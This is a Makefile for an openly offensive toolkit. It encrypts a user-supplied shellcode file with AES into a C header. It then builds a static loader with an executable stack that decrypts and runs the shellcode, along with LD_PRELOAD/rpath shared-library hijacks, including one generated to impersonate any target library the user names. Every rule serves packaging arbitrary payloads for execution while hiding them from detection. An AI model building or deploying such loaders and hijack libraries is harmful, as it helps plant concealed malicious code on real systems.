CC      := gcc
CFLAGS  := -Wall -Wno-unused-variable
SRCDIR  := src
DISTDIR := dist

SHELLCODE ?= shellcode.bin

# Default: drop shellcode.bin, run make, get the loader
.DEFAULT_GOAL := shellcode-runner

.PHONY: all clean shellcode-runner hijack-lib hijack encoder

all: shellcode-runner hijack-lib encoder

$(DISTDIR):
	@mkdir -p $(DISTDIR)

# --- Step 1: AES-encrypt shellcode.bin → C header (random key each build) ---
$(DISTDIR)/shellcode.h: $(SHELLCODE) $(SRCDIR)/aes-encoder.py | $(DISTDIR)
	@test -f $(SHELLCODE) || { echo "[!] Drop your shellcode as $(SHELLCODE) and re-run make"; exit 1; }
	python3 $(SRCDIR)/aes-encoder.py $(SHELLCODE) --header > $@
	@echo "[+] Encrypted $(SHELLCODE) → $@  (AES-128-ECB, $$(wc -c < $(SHELLCODE)) bytes)"

# --- Step 2: compile loader (static ELF, AES-decrypted at runtime) ---
shellcode-runner: $(DISTDIR)/shellcode-runner
$(DISTDIR)/shellcode-runner: $(SRCDIR)/shellcode-runner.c $(SRCDIR)/aes.h $(DISTDIR)/shellcode.h | $(DISTDIR)
	$(CC) $(CFLAGS) -I$(DISTDIR) -I$(SRCDIR) -static -z execstack -o $@ $<
	@echo "[+] Built $@"

# --- Minimal .so hijack (LD_PRELOAD / rpath) ---
hijack-lib: $(DISTDIR)/hijack-lib.so
$(DISTDIR)/hijack-lib.so: $(SRCDIR)/hijack-lib.c $(SRCDIR)/aes.h $(DISTDIR)/shellcode.h | $(DISTDIR)
	$(CC) $(CFLAGS) -shared -fPIC -I$(DISTDIR) -I$(SRCDIR) -o $@ $<
	@echo "[+] Built $@"

# --- Custom library hijack: make hijack TARGET=/path/to/libfoo.so.2 ---
.PHONY: hijack
hijack: $(DISTDIR)/shellcode.h | $(DISTDIR)
	@test -n "$(TARGET)" || { echo "[!] Usage: make hijack TARGET=/path/to/libtarget.so"; exit 1; }
	python3 $(SRCDIR)/gen-hijack-lib.py $(TARGET) > $(DISTDIR)/hijack-gen.c
	$(CC) $(CFLAGS) -shared -fPIC -I$(DISTDIR) -I$(SRCDIR) -o $(DISTDIR)/$(notdir $(TARGET)) $(DISTDIR)/hijack-gen.c
	@echo "[+] Built $(DISTDIR)/$(notdir $(TARGET))"

# --- Copy encoder script ---
encoder: $(DISTDIR)/aes-encoder.py
$(DISTDIR)/aes-encoder.py: $(SRCDIR)/aes-encoder.py | $(DISTDIR)
	cp $< $@
	chmod +x $@
	@echo "[+] Copied $@"

clean:
	rm -rf $(DISTDIR)
	@echo "[+] Cleaned"
